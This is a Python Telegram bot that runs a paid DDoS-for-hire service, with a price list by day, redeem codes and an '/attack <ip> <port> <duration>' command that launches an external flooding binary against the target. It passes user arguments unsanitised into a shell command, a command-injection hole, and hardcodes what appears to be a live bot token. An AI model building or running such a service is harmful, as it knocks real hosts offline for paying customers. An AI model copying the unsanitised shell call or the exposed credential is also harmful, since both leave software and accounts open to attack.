import os
import asyncio
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '7831102909:AAG3y0-k3qzoIX4SJCGtbHkDiDNJXuT3zdk'  # Replace with your bot token
ALLOWED_USER_ID = 6135948216  # Replace with your allowed user ID
bot_access_free = True

# A dictionary to store the redeemable codes and their associated values
REDEEM_CODES = {
    "FREE1DAY": 1,    # Example code for 1 free day
    "DISCOUNT10": 10, # Example code for a 10% discount
    # Add more codes here
}

# Start command to welcome the user
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command
    
    # Check if the user is allowed
    if user_id == ALLOWED_USER_ID:
        approval_status = "✅ Approved"
    else:
        approval_status = "❌ Not Approved"

    message = (
        f"*⚡️ Welcome to the battlefield, ULTRA_BHAI! ⚡️*\n\n"
        f"*👤 User ID:* {user_id}\n"
        f"*🔴 Status:* {approval_status}\n"
        f"*🚫 Access Restricted!* Contact admin for support.\n\n"
        "*💰 Pricing for the bot services: /price*"
    )
    
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Pricing command to show bot service pricing
async def price(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*Hello, ULTRA BHAI! 👋*\n\n"
        "*💰 Pricing for the bot services:*\n"
        "---------------------------\n"
        "• 1 Day:   120 💵\n"
        "• 2 Days: 185 💵\n"
        "• 3 Days: 250 💵\n"
        "• 4 Day:   310 💵\n"
        "• 5 Days: 375 💵\n"
        "• 6 Days: 410 💵\n"
        "• 7 Day:   450 💵\n\n"
        "*🔐 For private inquiries, reach out to the owners:* @ULTRA_BHAI, @name_hai"
    )
    
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Redeem command to allow users to redeem codes
async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user has provided a redeem code
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return

    redeem_code = context.args[0].upper()  # Convert the code to uppercase to ensure case-insensitivity

    # Check if the code is valid
    if redeem_code in REDEEM_CODES:
        value = REDEEM_CODES[redeem_code]
        # Respond with a success message and the corresponding service value
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*🎉 Code redeemed successfully! 🎉*\n"
                 f"*🔑 Code:* {redeem_code}\n"
                 f"*🏆 You have earned {value} day(s) of service!*",
            parse_mode='Markdown'
        )
        # Additional logic for applying the code can go here (e.g., updating user records)
    else:
        # If the code is invalid
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ Invalid code!* Please check the code or contact support.",
            parse_mode='Markdown'
        )

# Key command - Only available to the allowed user for generating a customized "jenkey"
async def key(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    if user_id == ALLOWED_USER_ID:
        # Generate a custom "jenkey" (can be a random alphanumeric string)
        jenkey = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        
        # Send the generated key to the user
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*🔑 Your custom Jenkey: {jenkey}*"
        )
    else:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ You are not authorized to use this command!*"
        )

# Attack command - Simulate an attack
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the /attack command
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Ensure correct usage (3 parameters: IP, port, and duration)
    if len(context.args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = context.args

    # Notify user that the attack has started
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*⚔️ Attack Launched! ⚔️*\n"
             f"*🎯 Target: {ip}:{port}*\n"
             f"*🕒 Duration: {duration} seconds*\n"
             f"*🔥 Let the battlefield ignite! 💥*",
        parse_mode='Markdown'
    )

    # Running external attack simulation or real attack here
    await run_attack(chat_id, ip, port, duration, context)

# Run the actual attack or simulate it
async def run_attack(chat_id, ip, port, duration, context):
    try:
        # Assuming `./SHYAM` is a command in the same directory
        process = await asyncio.create_subprocess_shell(
            f"./SHYAM {ip} {port} {duration} 05",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # Capture the output
        stdout, stderr = await process.communicate()

        # Send output to the user
        if stdout:
            await context.bot.send_message(chat_id=chat_id, text=f"*Output: {stdout.decode()}*", parse_mode='Markdown')
        if stderr:
            await context.bot.send_message(chat_id=chat_id, text=f"*Error: {stderr.decode()}*", parse_mode='Markdown')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

# Main function to set up the bot
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add handlers for the commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("price", price))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("key", key))  # Add the /key command handler
    application.add_handler(CommandHandler("attack", attack))  # Add the /attack command handler

    # Run the bot with polling
    application.run_polling()

if __name__ == '__main__':
    main()
